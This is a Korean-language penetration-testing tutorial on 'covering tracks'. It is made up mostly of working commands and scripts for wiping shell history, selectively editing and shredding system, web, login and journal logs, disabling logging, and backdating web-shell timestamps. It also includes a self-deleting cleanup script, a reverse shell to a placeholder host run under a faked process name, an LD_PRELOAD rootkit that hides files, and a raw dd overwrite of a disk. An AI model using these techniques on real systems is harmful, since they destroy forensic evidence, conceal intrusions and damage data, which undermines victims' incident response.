# Phase 8: 흔적 제거 (Covering Tracks)

## 개요
흔적 제거는 침투 테스트 또는 침해 활동의 흔적을 숨기거나 삭제하여 탐지를 회피하는 과정입니다. 로그 파일 조작, 명령 기록 삭제, 타임스탬프 변조 등을 포함합니다.

## 필수 도구
- 기본 Linux 명령어 (rm, shred, touch, sed)
- Log 편집 도구
- Rootkit (고급)

**주의**: 실제 침투 테스트에서는 고객과 합의된 범위 내에서만 수행하세요.

---

## 1. 명령 히스토리 삭제

### 1.1 Bash History
```bash
# 현재 세션 히스토리 삭제
history -c

# .bash_history 파일 삭제
rm ~/.bash_history
rm /root/.bash_history

# History 파일 완전 삭제 (복구 불가)
shred -vfz -n 10 ~/.bash_history

# 모든 사용자의 히스토리 삭제
find /home -name ".bash_history" -exec rm -f {} \;
find /root -name ".bash_history" -exec rm -f {} \;

# History 비활성화 (세션 중)
unset HISTFILE
export HISTFILESIZE=0
export HISTSIZE=0

# 특정 명령만 히스토리에서 삭제
history | grep "sensitive_command"  # 라인 번호 확인
history -d 1234  # 해당 라인 삭제

# 마지막 N개 명령 삭제
for i in {1..10}; do history -d $(history | tail -2 | head -1 | awk '{print $1}'); done
```

### 1.2 기타 쉘 히스토리
```bash
# Zsh
rm ~/.zsh_history
shred -vfz ~/.zsh_history

# Fish
rm ~/.local/share/fish/fish_history
shred -vfz ~/.local/share/fish/fish_history

# MySQL history
rm ~/.mysql_history
shred -vfz ~/.mysql_history

# Python history
rm ~/.python_history

# Less history
rm ~/.lesshst
```

### 1.3 세션 시작 전 히스토리 비활성화
```bash
# 히스토리 기록 안 되게 설정 후 명령 실행
set +o history
# ... 악의적인 명령 실행 ...
set -o history

# 또는 공백으로 시작하는 명령 (일부 설정에서)
 whoami  # 앞에 공백
 cat /etc/shadow

# .bashrc에서 히스토리 비활성화
echo 'HISTFILE=/dev/null' >> ~/.bashrc
echo 'HISTSIZE=0' >> ~/.bashrc
```

---

## 2. 로그 파일 조작

### 2.1 주요 로그 파일 위치
```bash
# 시스템 로그
/var/log/syslog          # Debian/Ubuntu 시스템 로그
/var/log/messages        # RedHat/CentOS 시스템 로그
/var/log/auth.log        # 인증 로그 (Debian/Ubuntu)
/var/log/secure          # 인증 로그 (RedHat/CentOS)
/var/log/kern.log        # 커널 로그
/var/log/dmesg           # 부팅 로그

# 웹 서버 로그
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log

# 애플리케이션 로그
/var/log/mysql/error.log
/var/log/postgresql/postgresql-*.log

# 사용자 활동 로그
/var/log/wtmp            # 로그인 기록
/var/log/btmp            # 실패한 로그인
/var/log/lastlog         # 마지막 로그인
```

### 2.2 로그 파일 삭제
```bash
# 로그 파일 완전 삭제
shred -vfz -n 10 /var/log/auth.log
shred -vfz -n 10 /var/log/syslog
shred -vfz -n 10 /var/log/apache2/access.log

# 여러 로그 한번에 삭제
for log in /var/log/apache2/*.log; do
    shred -vfz -n 10 "$log"
done

# 로그 파일 비우기 (삭제하지 않고)
> /var/log/auth.log
> /var/log/syslog
echo -n > /var/log/apache2/access.log

# 로그 디렉토리 전체 비우기 (위험!)
find /var/log -type f -exec shred -vfz -n 5 {} \;
```

### 2.3 특정 로그 엔트리만 삭제
```bash
# 특정 IP 주소 관련 로그 삭제
sed -i '/3.35.218.180/d' /var/log/apache2/access.log
sed -i '/YOUR_IP/d' /var/log/auth.log

# 특정 사용자 관련 로그 삭제
sed -i '/backdoor_user/d' /var/log/auth.log
sed -i '/sysupdate/d' /var/log/secure

# 특정 시간대 로그 삭제
sed -i '/Nov 28 15:3[0-9]/d' /var/log/syslog

# 특정 명령어 관련 로그 삭제
sed -i '/bash -i/d' /var/log/syslog
sed -i '/reverse shell/d' /var/log/syslog

# 백업 파일도 삭제
rm /var/log/auth.log.1
rm /var/log/syslog.1.gz
```

### 2.4 로그 로테이션 강제 실행
```bash
# 현재 로그를 아카이브하고 새 로그 시작
logrotate -f /etc/logrotate.conf

# 특정 로그만
logrotate -f /etc/logrotate.d/apache2

# 아카이브된 로그 삭제
rm /var/log/*.log.[0-9]*
rm /var/log/*.gz
```

---

## 3. 바이너리 로그 조작

### 3.1 wtmp (로그인 기록)
```bash
# wtmp 확인
last
last -f /var/log/wtmp

# 특정 사용자 로그인 기록 삭제
# utmpdump로 편집
utmpdump /var/log/wtmp > /tmp/wtmp.txt

# 편집 (공격자 로그인 제거)
sed -i '/backdoor_user/d' /tmp/wtmp.txt
sed -i '/YOUR_IP/d' /tmp/wtmp.txt

# 다시 바이너리로 변환
utmpdump -r /tmp/wtmp.txt > /var/log/wtmp

# 또는 완전 삭제
> /var/log/wtmp
shred -vfz /var/log/wtmp
```

### 3.2 btmp (실패한 로그인)
```bash
# btmp 확인
lastb
lastb -f /var/log/btmp

# 삭제
> /var/log/btmp
shred -vfz /var/log/btmp
```

### 3.3 lastlog (마지막 로그인)
```bash
# lastlog 확인
lastlog

# 특정 사용자 lastlog 삭제 (복잡함, 바이너리 직접 편집 필요)
# 또는 완전 삭제
> /var/log/lastlog
shred -vfz /var/log/lastlog
```

### 3.4 Journal (systemd)
```bash
# Journal 로그 확인
journalctl

# 특정 시간 이후 로그 삭제
journalctl --vacuum-time=1h

# 특정 크기 이상 로그 삭제
journalctl --vacuum-size=100M

# 모든 journal 로그 삭제
rm -rf /var/log/journal/*
systemctl restart systemd-journald

# Journal 비활성화
systemctl stop systemd-journald
systemctl disable systemd-journald
```

---

## 4. 웹 서버 로그 조작

### 4.1 Apache 로그
```bash
# Access log에서 공격 흔적 제거
sed -i '/shell.php/d' /var/log/apache2/access.log
sed -i '/YOUR_IP/d' /var/log/apache2/access.log
sed -i '/cmd=/d' /var/log/apache2/access.log
sed -i '/bash/d' /var/log/apache2/access.log

# Error log 정리
sed -i '/PHP Warning/d' /var/log/apache2/error.log
sed -i '/shell_exec/d' /var/log/apache2/error.log

# 모든 Apache 로그 삭제
for log in /var/log/apache2/*.log; do
    > "$log"
done
```

### 4.2 Nginx 로그
```bash
# Access log 정리
sed -i '/uploads\/shell.php/d' /var/log/nginx/access.log
sed -i '/YOUR_IP/d' /var/log/nginx/access.log

# 로그 비우기
> /var/log/nginx/access.log
> /var/log/nginx/error.log

# Nginx 로그 비활성화 (임시)
# /etc/nginx/nginx.conf에서
# access_log off;
# error_log /dev/null;
nginx -s reload
```

### 4.3 애플리케이션 로그
```bash
# PHP 로그
sed -i '/shell_exec/d' /var/log/php*.log

# MySQL 로그
sed -i '/mysqldump/d' /var/log/mysql/mysql.log

# 커스텀 애플리케이션 로그
find /var/www -name "*.log" -exec > {} \;
```

---

## 5. 파일 타임스탬프 조작

### 5.1 Touch 명령으로 타임스탬프 변경
```bash
# 현재 시간으로 변경
touch /tmp/backdoor.sh

# 특정 날짜/시간으로 변경
touch -t 202301010000 /tmp/backdoor.sh  # 2023-01-01 00:00

# 다른 파일과 같은 타임스탬프로 변경
touch -r /bin/bash /tmp/backdoor.sh

# Access time만 변경
touch -a -t 202301010000 /tmp/backdoor.sh

# Modification time만 변경
touch -m -t 202301010000 /tmp/backdoor.sh
```

### 5.2 모든 업로드 파일 타임스탬프 변경
```bash
# 웹쉘 타임스탬프를 정상 파일처럼 변경
touch -r /var/www/html/index.php /var/www/html/uploads/shell.php

# 디렉토리 내 모든 파일 타임스탬프 통일
REFERENCE_FILE="/var/www/html/index.php"
find /var/www/html/uploads -type f -exec touch -r "$REFERENCE_FILE" {} \;
```

### 5.3 디버그FS를 사용한 고급 타임스탬프 조작
```bash
# ext4 파일시스템에서 inode 직접 수정 (매우 고급)
debugfs -w /dev/sda1
debugfs: set_inode_field /tmp/backdoor.sh ctime 202301010000
debugfs: set_inode_field /tmp/backdoor.sh mtime 202301010000
debugfs: set_inode_field /tmp/backdoor.sh atime 202301010000
debugfs: quit

# 주의: 파일시스템 손상 위험
```

---

## 6. 네트워크 연결 기록 숨기기

### 6.1 현재 네트워크 연결 숨기기
```bash
# 특정 프로세스의 네트워크 연결 확인
netstat -antup | grep ESTABLISHED

# 리버스 쉘 프로세스 숨기기 (프로세스 이름 변경)
# C 코드로 argv[0] 변경 또는 exec -a 사용
exec -a '/usr/sbin/apache2' bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

### 6.2 iptables 로그 비활성화
```bash
# iptables 로깅 규칙 확인
iptables -L -v

# 로깅 규칙 삭제
iptables -D INPUT -j LOG
iptables -D OUTPUT -j LOG

# 모든 iptables 규칙 삭제 (위험!)
iptables -F
iptables -X
```

### 6.3 방화벽 로그 삭제
```bash
# UFW 로그
> /var/log/ufw.log

# iptables 로그 (syslog 내)
sed -i '/iptables/d' /var/log/syslog
sed -i '/firewall/d' /var/log/kern.log
```

---

## 7. 생성한 파일 및 사용자 정리

### 7.1 백도어 파일 삭제
```bash
# 생성한 웹쉘 삭제
shred -vfz /var/www/html/uploads/shell.php
shred -vfz /var/www/html/.config.php
shred -vfz /var/www/html/404.php

# SUID 백도어 삭제
find / -name ".hidden_bash" -exec shred -vfz {} \;
find / -name "rootbash" -exec shred -vfz {} \;

# 임시 디렉토리 정리
rm -rf /tmp/.hidden_exfil
rm -rf /tmp/.sys_check

# 백도어 스크립트 삭제
shred -vfz /root/.backup.sh
shred -vfz /usr/local/bin/monitor.sh
```

### 7.2 생성한 사용자 삭제
```bash
# 백도어 사용자 삭제
userdel -r sysupdate
userdel -r backdoor_user

# /etc/passwd에서 수동 추가한 사용자 제거
sed -i '/hacker:/d' /etc/passwd
sed -i '/hacker:/d' /etc/shadow

# 사용자 홈 디렉토리 완전 삭제
shred -vfz -n 5 /home/sysupdate/.bash_history
rm -rf /home/sysupdate
```

### 7.3 SSH 키 제거
```bash
# 추가한 authorized_keys 엔트리 삭제
sed -i '/attacker@kali/d' /root/.ssh/authorized_keys
sed -i '/YOUR_PUBLIC_KEY/d' /root/.ssh/authorized_keys

# 모든 사용자의 authorized_keys 정리
find /home -name "authorized_keys" -exec sed -i '/attacker@kali/d' {} \;
```

### 7.4 Cron/Systemd 백도어 제거
```bash
# Cron jobs 삭제
crontab -r  # 전체 crontab 삭제
crontab -e  # 수동으로 특정 라인 삭제
rm /etc/cron.d/system-update

# Systemd services 삭제
systemctl stop system-monitor.service
systemctl disable system-monitor.service
rm /etc/systemd/system/system-monitor.service
systemctl daemon-reload

# rc.local 정리
sed -i '/bash -i/d' /etc/rc.local
```

---

## 8. 자동화 스크립트

### 8.1 완전 정리 스크립트
```bash
#!/bin/bash
# cleanup_all.sh - 모든 흔적 제거

echo "[*] Starting cleanup process..."

# 1. History 삭제
echo "[*] Cleaning command history..."
history -c
rm -f ~/.bash_history /root/.bash_history
find /home -name ".bash_history" -exec rm -f {} \;
unset HISTFILE

# 2. 로그 파일 정리
echo "[*] Cleaning log files..."
> /var/log/auth.log
> /var/log/syslog
> /var/log/apache2/access.log
> /var/log/apache2/error.log
> /var/log/nginx/access.log
> /var/log/nginx/error.log

# 특정 IP 제거
for log in /var/log/*.log /var/log/*/*.log; do
    [ -f "$log" ] && sed -i '/YOUR_IP/d' "$log"
done

# 3. 바이너리 로그 정리
echo "[*] Cleaning binary logs..."
> /var/log/wtmp
> /var/log/btmp
> /var/log/lastlog

# Journal 정리
journalctl --vacuum-time=1h

# 4. 백도어 파일 삭제
echo "[*] Removing backdoor files..."
find /var/www -name "shell.php" -exec shred -vfz {} \;
find /tmp /var/tmp -name ".*bash" -exec shred -vfz {} \;
find / -name "rootbash" -exec shred -vfz {} \; 2>/dev/null

# 5. 사용자 삭제
echo "[*] Removing backdoor users..."
userdel -r sysupdate 2>/dev/null
userdel -r backdoor 2>/dev/null

# 6. Cron/Systemd 정리
echo "[*] Cleaning persistence mechanisms..."
crontab -r 2>/dev/null
rm -f /etc/cron.d/system-* 2>/dev/null

# Systemd services
for service in system-monitor backdoor netcat-listener; do
    systemctl stop $service 2>/dev/null
    systemctl disable $service 2>/dev/null
    rm -f /etc/systemd/system/$service.service 2>/dev/null
done
systemctl daemon-reload

# 7. SSH 키 정리
echo "[*] Cleaning SSH keys..."
sed -i '/attacker@kali/d' /root/.ssh/authorized_keys 2>/dev/null
find /home -name "authorized_keys" -exec sed -i '/attacker@kali/d' {} \; 2>/dev/null

# 8. 타임스탬프 복원
echo "[*] Restoring timestamps..."
touch -r /bin/bash /var/www/html/uploads/* 2>/dev/null

# 9. 자기 자신 삭제
echo "[*] Removing cleanup script..."
shred -vfz $0

echo "[+] Cleanup complete!"
```

### 8.2 선택적 정리 스크립트
```bash
#!/bin/bash
# selective_cleanup.sh - 특정 흔적만 제거

TARGET_IP="YOUR_IP"
TARGET_USER="sysupdate"
TARGET_FILES=("shell.php" ".config.php" "backdoor.sh")

echo "[*] Selective cleanup for IP: $TARGET_IP"

# 로그에서 특정 IP만 제거
for log in /var/log/*.log /var/log/*/*.log; do
    [ -f "$log" ] && sed -i "/$TARGET_IP/d" "$log"
done

# 특정 사용자 관련 로그 제거
for log in /var/log/auth.log /var/log/secure; do
    [ -f "$log" ] && sed -i "/$TARGET_USER/d" "$log"
done

# 특정 파일들만 삭제
for file in "${TARGET_FILES[@]}"; do
    find / -name "$file" -exec shred -vfz {} \; 2>/dev/null
done

echo "[+] Selective cleanup complete"
```

---

## 9. 고급 안티포렌식 기법

### 9.1 파일 완전 삭제
```bash
# shred (여러 번 덮어쓰기)
shred -vfz -n 25 sensitive_file.txt

# dd로 디스크 특정 영역 덮어쓰기
dd if=/dev/urandom of=/dev/sda bs=512 count=1000 seek=12345

# wipe 도구 사용
wipe -rf /tmp/exfiltrated_data/
```

### 9.2 메모리 정리
```bash
# Swap 정리
swapoff -a
swapon -a

# 메모리 캐시 정리
sync
echo 3 > /proc/sys/vm/drop_caches

# 특정 프로세스 메모리 덤프 방지
# gdb로 프로세스 메모리 덮어쓰기 (고급)
```

### 9.3 Rootkit 사용 (매우 고급)
```bash
# 경고: Rootkit은 시스템을 불안정하게 만들 수 있음

# 간단한 LD_PRELOAD rootkit으로 파일 숨기기
# 특정 파일/프로세스를 시스템 도구(ls, ps)에서 보이지 않게

# 예: hide.c
cat > /tmp/hide.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

struct dirent *(*original_readdir)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *dir;
    while ((dir = original_readdir(dirp))) {
        if (strstr(dir->d_name, "backdoor") != NULL) {
            continue;  // "backdoor" 포함 파일 숨김
        }
        break;
    }
    return dir;
}
EOF

gcc -shared -fPIC -o /lib/hide.so /tmp/hide.c -ldl
echo '/lib/hide.so' > /etc/ld.so.preload

# 이제 "backdoor"가 포함된 파일명은 ls에서 보이지 않음
```

---

## 10. 정리 점검 리스트

### 10.1 흔적 제거 체크리스트
```
[ ] 명령 히스토리 삭제 (.bash_history, .mysql_history 등)
[ ] 시스템 로그 정리 (/var/log/auth.log, syslog 등)
[ ] 웹 서버 로그 정리 (access.log, error.log)
[ ] 바이너리 로그 정리 (wtmp, btmp, lastlog)
[ ] Journal 로그 정리 (journalctl --vacuum)
[ ] 백도어 파일 삭제 (웹쉘, SUID 바이너리)
[ ] 백도어 사용자 삭제
[ ] SSH 키 제거 (authorized_keys)
[ ] Cron jobs 삭제
[ ] Systemd services 삭제
[ ] 파일 타임스탬프 복원
[ ] 네트워크 연결 기록 정리
[ ] 임시 파일 완전 삭제 (shred)
[ ] 자기 자신(정리 스크립트) 삭제
```

### 10.2 정리 후 검증
```bash
# History 확인
cat ~/.bash_history
history

# 로그 확인
tail -100 /var/log/auth.log | grep -i "YOUR_IP\|sysupdate\|bash -i"
tail -100 /var/log/apache2/access.log | grep "shell.php"

# 사용자 확인
cat /etc/passwd | grep -v nologin

# 백도어 파일 확인
find / -name "*shell*" -o -name "*backdoor*" 2>/dev/null

# Cron jobs 확인
crontab -l
cat /etc/crontab

# Systemd services 확인
systemctl list-units --type=service --state=running
```

---

## 핵심 정리

1. History 먼저 - 명령 히스토리는 가장 먼저 삭제
2. 로그 선택적 제거 - 모든 로그 삭제는 의심스러움, 특정 엔트리만 제거
3. Shred 사용 - rm 대신 shred로 완전 삭제
4. 타임스탬프 복원 - 파일 생성/수정 시간 정상 파일과 동일하게
5. 자동화 스크립트 - 마지막에 자기 자신도 삭제하도록 작성

## 다음 단계
Phase 9: 고급 기법 (Advanced Techniques)으로 진행하여 추가 공격 벡터 학습
